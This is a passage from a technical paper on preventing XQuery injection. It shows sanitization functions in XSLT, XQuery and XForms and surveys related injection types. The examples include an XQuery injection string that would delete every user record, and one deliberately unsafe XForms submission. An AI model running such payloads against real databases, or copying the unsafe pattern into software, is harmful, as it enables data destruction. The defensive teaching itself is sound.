               encode-for-uri($usernameNormalized) , '&amp;amp;_query=', encode-for-uri($query)))"/&gt;
               
            </div>
            <div class="para e206">Here again; the choice to normalize spaces and convert to lower case depends on the
               context.
            </div><a name="XSLT20ANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e207">
               <div class="title e208">XSLT 2.0</div>
               <div class="para e209">In XSLT 2.0, functions can be used to implement this technique like those shown in
                  this transformation: 
               </div>
               <div class="programlisting e210" xml:space="preserve">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
                  &lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:san="http://example.com/sanitization/"
                  xmlns:xs="http://www.w3.org/2001/XMLSchema" exclude-result-prefixes="xs" version="2.0"&gt;
                  
                  &lt;xsl:output method="text"/&gt;
                  
                  &lt;xsl:function name="san:sanitize-apos" as="xs:string"&gt;
                  &lt;xsl:param name="text" as="xs:string"/&gt;
                  &lt;xsl:sequence select="replace(replace($text, '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;')"/&gt;
                  &lt;/xsl:function&gt;
                  &lt;xsl:function name="san:sanitize-quot" as="xs:string"&gt;
                  &lt;xsl:param name="text" as="xs:string"/&gt;
                  &lt;xsl:sequence select='replace(replace($text, "&amp;amp;", "&amp;amp;amp;"), """", "&amp;amp;quot;")'/&gt;
                  &lt;/xsl:function&gt;
                  
                  &lt;xsl:template match="/"&gt;
                  &lt;xsl:value-of select="san:sanitize-apos(''' or ( for $u in //user return update delete
                  $u/(@*|node() ) ) or .=''')"/&gt;
                  &lt;/xsl:template&gt;
                  
                  &lt;/xsl:stylesheet&gt;
               </div>
            </div><a name="XQueryANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e211">
               <div class="title e212">XQuery</div>
               <div class="para e213">Similar functions can be defined in XQuery:</div>
               <div class="programlisting e214" xml:space="preserve">xquery version "1.0";
                  
                  declare function local:sanitize-apos($text as xs:string) as xs:string {
                  replace(replace($text, '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;')
                  };
                  
                  declare function local:sanitize-apos($text as xs:string) as xs:string {
                  replace(replace($text, "&amp;amp;", "&amp;amp;amp;"), """", "&amp;amp;quot;")
                  };
                  
                  
                  local:sanitize-apos(''' or ( for $u in //user return update delete $u/(@*|node() )
                  ) or .=''')
               </div>
            </div>
         </div><a name="XFormsANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e215">
            <div class="title e216">XForms</div>
            <div class="para e217">The problem is very similar in XForms with the difference that XForms is meant to
               deal with user input and that the chances that you'll hit the problem are significantly
               bigger!
            </div>
            <div class="para e218">The rule of thumb here again is: never inject a user input in an XQuery without sanitizing
               it or moving it out of the query using request parameters.
            </div>
            <div class="para e219">When using an implementation such as Orbeon Forms, that supports attribute value templates
               in 
               <div class="code e220">resource</div> attributes, it may be tempting to write submissions such as:
            </div>
            <div class="programlisting e221" xml:space="preserve"> &lt;xforms:submission id="doSearch" method="get"
               resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=//user[mail='{instance('search')}']"
               
               instance="result" replace="instance"/&gt;
               
            </div>
            <div class="para e222">Unfortunately, this would be tantamount to the unsafe Java realm that we've used as
               our first example!
            </div>
            <div class="para e223">To secure this submission, we can just adapt one of the two methods used to secure
               XSLT accesses. This is especially straightforward with the Orbeon implementation that
               implements an
               
               <div class="code e224">xxforms:variable</div> extension very similar to XSLT variables. You can also go with FLOWR expressions
               or use 
               <div class="code e225">xforms:bind/@calculate</div> definitions to store intermediate
               results and make them more readable but it is also possible to write a mega XPath
               2.0 expression such as this one:
            </div>
            <div class="programlisting e226" xml:space="preserve"> &lt;xforms:submission id="doSearch" method="get"
               resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?_query={encode-for-uri(concat(
               '//user[mail=''', 
               lower-case(normalize-space(replace(replace(instance('search'), '&amp;amp;', '&amp;amp;amp;'),
               '''', '&amp;amp;apos;'))), 
               ''']'))}"
               instance="result" replace="instance"/&gt;
            </div>
            <div class="para e227">The same methods can be applied using query parameters:</div>
            <div class="programlisting e228" xml:space="preserve">  &lt;xforms:submission id="doSearch" method="get"
               resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?mail={
               encode-for-uri(lower-case(instance('search')))
               }&amp;amp;_query={
               encode-for-uri('declare namespace request=''http://exist-db.org/xquery/request'';
               //user[mail=request:get-parameter(''mail'',0)]')}"
               instance="result" replace="instance"/&gt;
            </div>
            <div class="para e229">This is working, but we can do much simpler relying on XForms to do the encoding all
               by itself!. The complete XForms model would then be:
            </div>
            <div class="programlisting e230" xml:space="preserve">        &lt;xforms:model&gt;
               &lt;xforms:instance id="search"&gt;
               &lt;search xmlns=""&gt;
               &lt;mail/&gt;
               &lt;_query&gt;declare namespace request='http://exist-db.org/xquery/request';
               //user[mail=request:get-parameter('mail',0)]&lt;/_query&gt;
               &lt;/search&gt;
               &lt;/xforms:instance&gt;
               &lt;xforms:instance id="result"&gt;
               &lt;empty xmlns=""/&gt;
               &lt;/xforms:instance&gt;
               &lt;xforms:submission id="doSearch" method="get" ref="instance('search')"
               resource="http://localhost:8080/orbeon/exist/rest/db/app/users/"
               instance="result" replace="instance"/&gt;
               &lt;/xforms:model&gt;
            </div>
         </div><a name="RelatedAttacksANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e231" xml:id="evaluate">
            <div class="title e232">Related Attacks</div>
            <div class="para e233">We have explored in depth injections targeted on XQuery string literals. What about
               other injections on XML based applications?
            </div><a name="XQueryNumericLiteralInjectionANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e234">
               <div class="title e235">XQuery Numeric Literal Injection</div>
               <div class="para e236">It may be tempting to copy numeric input fields directly into XQuery expressions.
                  That's safe if, and only if, these fields are validated. If not, the techniques that
                  we've seen with
                  string literals can easily be adapted (in fact, it's even easier for your attackers
                  since they do not need to bother with quotes!).
               </div>
               <div class="para e237">That's safe if you pass these values within request parameters but you will generate
                  XQuery parsing errors if the input doesn't belong to the expected data type. Also
                  note that 
                  <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e238" xlink:actuate="onRequest" xlink:href="http://demo.exist-db.org/exist/functions/request/get-parameter" xlink:show="new" xlink:type="simple">request:get-parameter()</div> returns string values and may need casting in your XQuery query.
               </div>
               <div class="para e239">In both cases, it is a good idea to validate numeric input fields before sending your
                  query (this is a case where filters can be used without risking to get Tim O'Reilly
                  angry)!
               </div>
               <div class="para e240">When using XForms, this can be done by binding these inputs to numeric datatypes.
                  Otherwise, use whatever language you are programming with to do the test.
               </div>
               <div class="para e241">If you use literals and don't want (or can't) do that test outside the XQuery query
                  itself, you can also copy the value in a string literal and explicitly cast it into
                  the numeric data
                  type you are using. The string literal then needs to be sanitized like we've already
                  seen.
               </div>
            </div><a name="XQueryDirectElementInjectionANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e242">
               <div class="title e243">XQuery Direct Element Injection</div>
               <div class="para e244">Literals are the location where user input is most likely copied in XQuery based applications
                  (they cover all the cases where the database is queried according to parameters entered
                  by
                  our users) but there are cases where you may want to copy user input within XQuery
                  direct element constructors.
               </div>
               <div class="para e245">One of the use cases for this is the XQuery Update Facility where update primitives
                  may contain direct element constructors, in which it is tempting to include input
                  fields
                  values.
               </div>
               <div class="para e246">Here again you're safe if you use request parameters but you need to sanitize your
                  input if you're doing direct copy.
               </div>
               <div class="para e247">The danger here is not so much delimiters but rather enclosed expressions that let
                  your attacker include arbitrary XQuery expressions.
               </div>
               <div class="para e248">The 
                  <div class="code e249">&lt;</div> also needs to be escaped as it would be understood as a tag delimiter as well, of
                  course as the 
                  <div class="code e250">&amp;</div>..
               </div>
               <div class="para e251">That makes 4 characters to escape:</div>
               <div class="orderedlist e252">
                  <div class="listitem e253">
                     <div class="para e254">
                        <div class="code e255">&amp;</div> must be replaced by 
                        <div class="code e256">&amp;amp;</div>
                     </div>
                  </div>
                  <div class="listitem e257">
                     <div class="para e258">
                        <div class="code e259">&lt;</div> must be replaced by 
                        <div class="code e260">&amp;lt;</div>
                     </div>
                  </div>
                  <div class="listitem e261">
                     <div class="para e262">
                        <div class="code e263">{</div> must be replaced by 
                        <div class="code e264">{{</div>
                     </div>
                  </div>
                  <div class="listitem e265">
                     <div class="para e266">
                        <div class="code e267">}</div> must be replaced by 
                        <div class="code e268">}}</div>
                     </div>
                  </div>
               </div>
            </div><a name="XUpdateinjectionANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e269">
               <div class="title e270">XUpdate injection</div>
               <div class="para e271">XUpdate is safer than XQuery Update Facility since the latter has no support for enclosed
                  expressions. That doesn't mean that 
                  <div class="code e272">&amp;</div> and 
                  <div class="code e273">&lt;</div> are not meant to be
                  escaped but since XUpdate documents are a well formed XML documents, the tool or API
                  that you'll be using to create this document will take care of that if it's an XML
                  tool
               </div>
               <div class="para e274">Unfortunately XUpdate uses XPath expressions to qualify the targets where updates
                  should be applied, and if you use a database like eXist, which supports XPath 2.0
                  (or XQuery 1.0) in
                  these expressions, this opens a door for attacks that are similar to XQuery literal
                  injections.
               </div>
               <div class="para e275">Again, if you use request parameters you'll be safe.</div>
               <div class="para e276">If not, the sanitization to apply is the same as that for XQuery injection except
                  that the XML tool or API that you'll be using should take care of the XML entities.
               </div>
            </div><a name="*:evaluate()injectionANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e277">
               <div class="title e278">*:evaluate() injection</div>
               <div class="para e279">Extension functions such as 
                  <div class="code e280">saxon:evaluate</div> (or eXist's 
                  <div class="code e281">util:eval()</div>) are also prone to attacks similar to XQuery injection if user input is not properly
                  sanitized.
               </div>
               <div class="para e282">The consequences of these injections may be amplified by extension functions that
                  provide read and write access to system resources but even vanilla XPath can be harmful
                  with its
                  
                  <div class="code e283">document()</div> function that provides read access to the file system as well as network resources
                  that may be behind the firewall protecting the server.
               </div>
               <div class="para e284">These function calls need to be secured using similar techniques adapted to the context
                  where the function is used.
               </div>
               <div class="para e285">Defining variables out of the function call and using these variables within the function
                  call is an effective solution quite similar to using query parameters in a query.
               </div>
               <div class="note e286">
                  <div class="para e287">When such functions are called inside a query, you may have to sanitize twice! In
                     that case, the second level of sanitization can be done in XQuery.
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
</div>